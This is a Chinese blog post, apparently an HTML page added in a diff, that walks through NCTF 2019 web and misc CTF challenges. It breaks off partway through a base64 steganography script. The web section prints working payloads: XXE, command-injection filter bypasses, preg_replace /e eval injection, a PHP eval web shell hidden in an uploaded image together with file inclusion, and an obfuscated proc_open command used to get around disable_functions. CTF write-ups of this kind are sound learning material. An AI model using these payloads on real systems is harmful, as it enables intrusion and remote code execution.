@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="https://cuokon.github.io/live2d/autoload.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "23b069a1"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="WEB第一题题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 第二题简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019nctf wp(web,misc)">
+<meta property="og:url" content="http://cuokon.github.com/2019/11/24/nctf/index.html">
+<meta property="og:site_name" content="错空&#39;s Blog">
+<meta property="og:description" content="WEB第一题题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 第二题简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/1-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/1-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-3.jpg">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/2-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/3-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/4-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/5-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/6-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/6-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/6-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/6-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/6-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/7-0.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/7-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/7-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/7-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/2019nctf/7-4.png">
+<meta property="og:updated_time" content="2019-11-25T02:59:36.790Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019nctf wp(web,misc)">
+<meta name="twitter:description" content="WEB第一题题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了 第二题简单的代码看了一下他一共有3个关卡,1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数">
+<meta name="twitter:image" content="http://cuokon.github.com/image/2019nctf/1-0.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://cuokon.github.com/2019/11/24/nctf/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>2019nctf wp(web,misc) | 错空's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">错空's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学无止境</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/11/24/nctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cuo kon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/43626445">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="错空's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019nctf wp(web,misc)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-24 20:23:12" itemprop="dateCreated datePublished" datetime="2019-11-24T20:23:12+08:00">2019-11-24</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-11-25 10:59:36" itemprop="dateModified" datetime="2019-11-25T10:59:36+08:00">2019-11-25</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习记录/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+		  
+		  
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.7k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="../../../../image/2019nctf/1-0.png" alt><br>题目已经说了flag在根目录,所以只要用XXE访问到根目录就可以了<br><img src="../../../../image/2019nctf/1-1.png" alt></p>
+<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="../../../../image/2019nctf/2-0.png" alt><br><img src="../../../../image/2019nctf/2-1.png" alt><br>简单的代码看了一下他一共有3个关卡,<br>1.传入的num的值不可以等于23333,并且这个值要被正则表达式/^23333$/匹配到<br>2.传入str1和str2的md5值不可以一样,但是经过strtr函数替换后的md5值要一样<br>3.传入的参数不可以大于8个字符,参数中不可以包含_字符,然后对$cmd用空额进行分割里面的参数不可以出现cat命令</p>
+<p>解题思路:<br>1.在传入换行符的时候,可以让/^$/匹配到(fuzz发现的),所以我们主要传入23333%0a就可以绕过第一关<br>2.如果一个md5是0e开头且后面都是数字的2个md5进行弱类型比较的时候,会一样,因为strtr函数里面他回把c替换为0,所以我们只要找到ce开头的且后面都是数字的md5值就可以绕过<br>3.在传入get参数时,如果参数包括<code>.</code>就会自动替换为<code>_</code>,因为我们传入的字符不可以大于8并且不可以用cat命令,那么我们可以用tac(查看内容并且进行反转)代替cat,然后我们可以用通配符<code>*</code>来减短长度</p>
+<p>绕过第一关<br>传入参数num=23333%0a<br><img src="../../../../image/2019nctf/2-2.png" alt></p>
+<p>绕过第二关<br>我们可以用脚本进行爆破md5值<br>脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">100000000000</span>;$i++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">"/^ce\d&#123;30&#125;$/"</span>,md5($i)))</span><br><span class="line">  <span class="keyword">echo</span> $i.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/2019nctf/2-3.jpg" alt></p>
+<p>传入参数str1=586180707&amp;str2=1000766792<br><img src="../../../../image/2019nctf/2-4.png" alt></p>
+<p>绕过第三<br>我们要先查看flag文件在哪里,传入参数<code>q.w.q=ls</code><br><img src="../../../../image/2019nctf/2-5.png" alt><br>因为当前只有一个f开头的文件,所以我们可以用通配符<code>*</code>来绕过长度限制,传入参数<code>q.w.q=tac f*</code><br><img src="../../../../image/2019nctf/2-6.png" alt><br>然后在用linux把内容反过来,就可以拿到flag<br><img src="../../../../image/2019nctf/2-7.png" alt></p>
+<h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p><img src="../../../../image/2019nctf/3-0.png" alt><br>打开页面发现就是一个替换字符串的,然后在随便乱点是时候看到了一个hint.php<br><img src="../../../../image/2019nctf/3-1.png" alt><br>刚开始看到还有点懵,然后在无意间在替换的时候,发现他报错了<br><img src="../../../../image/2019nctf/3-2.png" alt><br>然后看到报错信息,有个preg_replace正则替换函数,然后上面php5.6就想到了,他应该是有用/e去匹配,然后有对替换的内容进行eval处理,导致命令执行</p>
+<p>先执行一个phpinfo()<br><img src="../../../../image/2019nctf/3-3.png" alt><br>然后执行命令的时候发现被拦截了<br><img src="../../../../image/2019nctf/3-4.png" alt><br>然后通过fuzz发现,会过滤’号<br><img src="../../../../image/2019nctf/3-5.png" alt><br>然后可以用<code>eval($_GET[0])</code>,这样来执行命令就不会出现单引号<br><img src="../../../../image/2019nctf/3-6.png" alt><br>然后在根目录发现flag,然后查看即可<br><img src="../../../../image/2019nctf/3-7.png" alt></p>
+<h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p><img src="../../../../image/2019nctf/4-0.png" alt><br>题目说要找到上传点,然后在进行骚操作。<br>点击头像发现,有image的字样。<br><img src="../../../../image/2019nctf/4-1.png" alt><br>然后点进去发现上传点<br><img src="../../../../image/2019nctf/4-2.png" alt><br>观察url发现,他有可能存在文件包含,然后试着去包含/etc/passwd能不能返回内容<br><img src="../../../../image/2019nctf/4-3.png" alt><br>思路就是:上传个图片里面藏有一句话木马,然后利用文件包含去包含就可以了。</p>
+<p>在正常上传图片的时候,发现竟然被拦截了<br><img src="../../../../image/2019nctf/4-4.png" alt><br>通过他拦截信息可以知道,内容不可以用<code>&lt;?</code>的字符,有可能是图片中包含了这些字符所以被拦截了。我们可以只取图片的头部分然后在上传(只要把中间的大部分内容给删掉就可以了,如果还提示<code>&lt;?</code>拦截的消息就继续删),然后再次上传。<br><img src="../../../../image/2019nctf/4-5.png" alt><br>发现他说,图片上传成功但是不可以获取到flag值,那我们在里面传入一句话木马就可以了,因为他过滤了<code>&lt;?</code>所以我们要用其他标签代替<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>代替。最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">eval</span>($_REQUEST[<span class="number">0</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提示上传成功<br><img src="../../../../image/2019nctf/4-6.png" alt><br>然后用文件包含去包含就可以拿到flag了<br><img src="../../../../image/2019nctf/4-7.png" alt></p>
+<h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p><img src="../../../../image/2019nctf/5-0.png" alt><br>题目说:黑客写的一句话木马,然后我们要利用一句话木马去执行命令<br><img src="../../../../image/2019nctf/5-1.png" alt><br>然后通过简单的审计,有2个条件<br>1.要指定一个存在的目录<br>2.不可以出现函数的字符串</p>
+<p>其实绕过也很简单</p>
+<ol>
+<li>./目录这个代表当前文件,所以肯定是存在的</li>
+<li>既然我们不可以传入函数字符串,那么我们可以对函数的字符串进行拆分,然后在执行(php有变量函数这种语法)</li>
+</ol>
+<p>首页执行一个phpinfo命令,传入如下payload<br><code>$a=&#39;php&#39;;$a.=&#39;info&#39;;$a();</code><br><img src="../../../../image/2019nctf/5-2.png" alt><br>命令执行成功,但是通过disable_functions发现禁用了大部分命令执行函数,和其他文件操作的函数,但是经过黑名单对比,发现了漏了一个命令执行函数<code>proc_open()</code>,然后查看别人使用方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$test = <span class="string">"whoami"</span>;  </span><br><span class="line">$array =<span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"r"</span>),   <span class="comment">//标准输入  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>),   <span class="comment">//标准输出内容  </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>)    <span class="comment">//标准输出错误  </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line">$fp = proc_open($test,$array,$pipes);   <span class="comment">//打开一个进程通道  </span></span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($pipes[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容  </span></span><br><span class="line">proc_close($fp);</span><br></pre></td></tr></table></figure>
+
+<p>然后因为一些限制,例如array他不是一个函数所以就不可以用变量函数来代替,然后就替换为了<code>[]</code>来代替数组,还有echo也是一样,但是可以用<code>print_r</code>来代替。因为里面的一些变量和字符串也存在函数名,所以也要替换。最后修改后的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = &quot;whoami&quot;;</span><br><span class="line">$p=&quot;pr&quot;;</span><br><span class="line">$p.=&apos;oc_&apos;;</span><br><span class="line">$p.=&apos;open&apos;;</span><br><span class="line">$ec=&quot;prin&quot;;</span><br><span class="line">$ec.=&quot;t_r&quot;;</span><br><span class="line">$s=&apos;st&apos;;</span><br><span class="line">$s.=&apos;r&apos;;</span><br><span class="line">$s.=&apos;eam&apos;;</span><br><span class="line">$s.=&apos;_ge&apos;;</span><br><span class="line">$s.=&apos;t_co&apos;;</span><br><span class="line">$s.=&apos;nten&apos;;</span><br><span class="line">$s.=&apos;ts&apos;;</span><br><span class="line">$array = [[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;r&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;],[&quot;p&quot;.&quot;i&quot;.&quot;pe&quot;,&quot;w&quot;]];</span><br><span class="line">$fp = $p($test,$array,$pes);</span><br><span class="line">$ec($s($pes[1]));</span><br></pre></td></tr></table></figure>
+
+<p>然后去掉换行符并且进行进行url编码最后变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$test%20=%20%22whoami%22;$p%20=%20%22pr%22;$p.=%27oc_%27;$p.=%27open%27;$ec=%22prin%22;$ec.=%22t_r%22;$s=%27st%27;$s.=%27r%27;$s.=%27eam%27;$s.=%27_ge%27;$s.=%27t_co%27;$s.=%27nten%27;$s.=%27ts%27;$array%20=%20[[%22p%22.%22i%22.%22pe%22,%22r%22],[%22p%22.%22i%22.%22pe%22,%22w%22],[%22p%22.%22i%22.%22pe%22,%22w%22]];$fp%20=%20$p($test,$array,$pes);$ec($s($pes[1]));</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/2019nctf/5-3.png" alt><br>命令执行成功,然后在根目录发现flag,但是有个问题出现了,他的flag不可读<br><img src="../../../../image/2019nctf/5-4.png" alt><br>但是还发现里面有个readflag,然后试着打开看看里面的内容<br><img src="../../../../image/2019nctf/5-5.png" alt><br><img src="../../../../image/2019nctf/5-6.png" alt><br>他是一个elf可执行文件,然后在里面还有/bin/cat flag的字样,猜测他就是用来查看flag的,然后运行这个elf文件<br><img src="../../../../image/2019nctf/5-7.png" alt></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="第一题-1"><a href="#第一题-1" class="headerlink" title="第一题"></a>第一题</h3><p>打开就是一张图片<br><img src="../../../../image/2019nctf/6-0.png" alt><br>然后用binwalk进行分析发现了他内藏其他的图片,然后进行分离(加个-e)参数<br><img src="../../../../image/2019nctf/6-1.png" alt><br>发现有个hint.txt查看后经过翻译后的内容是:试着找出像素的秘密<br><img src="../../../../image/2019nctf/6-2.png" alt><br>然后用Stegsolve.jar进行分析,先打个第二个图片,用里面图片组合器,选择第一张图片进行处理<br><img src="../../../../image/2019nctf/6-3.png" alt><br>然后点了几下按钮,发现了二维码,扫码拿flag<br><img src="../../../../image/2019nctf/6-4.png" alt></p>
+<h3 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a>第二题</h3><p><img src="../../../../image/2019nctf/7-0.png" alt><br>里面是数据包,数据非常小,就是有个传了个压缩文件<br><img src="../../../../image/2019nctf/7-1.png" alt><br>打开发现是密码,然后发现是伪加密,修改16进制位,把09标志位变成00(如果有些压缩软件说这不是一个有效的压缩包,就要把http头部内容删掉)<br><img src="../../../../image/2019nctf/7-2.png" alt><br>然后查看里面的文件发现了一堆base64<br><img src="../../../../image/2019nctf/7-3.png" alt><br>怀疑是base64隐写,利用别人的脚本进行解密,这里打开的是1.txt记得对文件重命名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span 